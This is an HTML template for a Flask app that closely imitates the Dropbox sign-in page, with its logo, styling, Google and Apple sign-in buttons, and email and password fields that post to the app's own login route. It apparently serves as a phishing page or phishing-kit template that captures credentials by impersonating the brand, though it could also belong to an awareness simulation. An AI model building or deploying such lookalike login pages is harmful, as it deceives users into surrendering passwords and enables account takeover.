<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to Dropbox</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #f4f5f7;
            color: #172b4d;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 40px 16px;
        }

        .dropbox-body {
            width: 100%;
            max-width: 420px;
            background: #ffffff;
            border-radius: 12px;
            padding: 40px 32px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.06);
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .dropbox-logo-container {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 24px;
        }

        .dropbox-title {
            font-size: 24px;
            font-weight: 700;
            color: #1e1919;
            margin-bottom: 24px;
        }

        .sso-btn {
            width: 100%;
            height: 44px;
            background: #ffffff;
            border: 1px solid #1e191926;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            font-size: 14px;
            font-weight: 600;
            color: #1e1919;
            cursor: pointer;
            margin-bottom: 12px;
            transition: background-color 0.15s;
        }

        .sso-btn:hover {
            background-color: #f7f5f2;
        }

        .dropbox-divider {
            display: flex;
            align-items: center;
            width: 100%;
            margin: 20px 0;
            color: #726e6e;
            font-size: 13px;
        }

        .dropbox-divider::before, .dropbox-divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: #1e191926;
        }

        .dropbox-divider span {
            padding: 0 12px;
        }

        .dropbox-form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 16px;
        }

        .dropbox-input-group {
            display: flex;
            flex-direction: column;
            gap: 6px;
        }

        .dropbox-label {
            font-size: 13px;
            font-weight: 600;
            color: #1e1919;
        }

        .dropbox-input {
            width: 100%;
            height: 40px;
            padding: 8px 12px;
            border: 1px solid #1e191933;
            border-radius: 8px;
            font-size: 14px;
            outline: none;
        }

        .dropbox-input:focus {
            border-color: #0061fe;
            box-shadow: 0 0 0 2px rgba(0, 97, 254, 0.2);
        }

        .dropbox-btn {
            width: 100%;
            height: 44px;
            background-color: #0061fe;
            color: #ffffff;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
            transition: background-color 0.15s;
        }

        .dropbox-btn:hover {
            background-color: #0052d4;
        }

        .dropbox-footer-links {
            margin-top: 20px;
            display: flex;
            justify-content: space-between;
            width: 100%;
            font-size: 13px;
        }

        .dropbox-footer-links a {
            color: #0061fe;
            text-decoration: none;
        }

        .dropbox-footer-links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="dropbox-body">
        <div class="dropbox-logo-container">
            <svg width="36" height="36" viewBox="0 0 64 64" fill="none">
                <path d="M19.1 12L32 20.3L19.1 28.6L6.2 20.3L19.1 12Z" fill="#0061FE"/>
                <path d="M44.9 12L57.8 20.3L44.9 28.6L32 20.3L44.9 12Z" fill="#0061FE"/>
                <path d="M6.2 36.9L19.1 28.6L32 36.9L19.1 45.2L6.2 36.9Z" fill="#0061FE"/>
                <path d="M57.8 36.9L44.9 28.6L32 36.9L44.9 45.2L57.8 36.9Z" fill="#0061FE"/>
                <path d="M19.1 47.9L32 39.6L44.9 47.9L32 56.2L19.1 47.9Z" fill="#0061FE"/>
            </svg>
            <span style="font-size: 22px; font-weight: 800; color: #1e1919; letter-spacing: -0.5px;">Dropbox</span>
        </div>

        <h2 class="dropbox-title">Sign in to your account</h2>

        <button class="sso-btn">
            <svg width="18" height="18" viewBox="0 0 24 24">
                <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"/>
                <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"/>
            </svg>
            Continue with Google
        </button>

        <button class="sso-btn">
            <svg width="18" height="18" viewBox="0 0 170 170" fill="currentColor">
                <path d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.19-2.12-9.97-3.17-14.34-3.17-4.58 0-9.49 1.05-14.75 3.17-5.26 2.13-9.5 3.24-12.74 3.35-4.83.13-9.76-1.92-14.79-6.14-3.23-2.63-7.14-7.22-11.73-13.78-6.19-8.81-11.13-18.73-14.83-29.74-3.7-11.02-5.55-21.36-5.55-31.02 0-14.02 3.55-25.75 10.65-35.18 7.1-9.43 16.03-14.28 26.8-14.54 4.83 0 10.12 1.25 15.88 3.75 5.76 2.5 9.77 3.75 12.03 3.75 1.83 0 5.82-1.25 11.97-3.75 6.15-2.5 11.23-3.64 15.24-3.42 11.37.76 20.6 4.96 27.7 12.61-10.14 6.15-15.11 14.63-14.9 25.44.22 8.4 3.42 15.54 9.61 21.43 6.19 5.88 13.62 9.22 22.28 10.01-2.29 6.81-5.32 13.75-9.1 20.82zM119.22 31.02c0-7.3 2.65-14.32 7.96-21.05 5.31-6.73 12.02-10.87 20.13-12.42.22.98.33 1.96.33 2.94 0 7.19-2.73 14.31-8.18 21.36-5.45 7.05-12.21 11.23-20.27 12.54-.11-.98-.22-2.1-.22-3.37z"/>
            </svg>
            Continue with Apple
        </button>

        <div class="dropbox-divider">
            <span>or</span>
        </div>

        <form class="dropbox-form" action="{{ url_for('login') }}" method="POST">
            <div class="dropbox-input-group">
                <label class="dropbox-label" for="db-email">Email</label>
                <input type="email" id="db-email" name="username" class="dropbox-input" required>
            </div>

            <div class="dropbox-input-group">
                <label class="dropbox-label" for="db-password">Password</label>
                <input type="password" id="db-password" name="password" class="dropbox-input" required>
            </div>

            <button type="submit" class="dropbox-btn">Sign in</button>
        </form>

        <div class="dropbox-footer-links">
            <a href="#">Forgot your password?</a>
            <a href="#">Create an account</a>
        </div>
    </div>

</body>
</html>
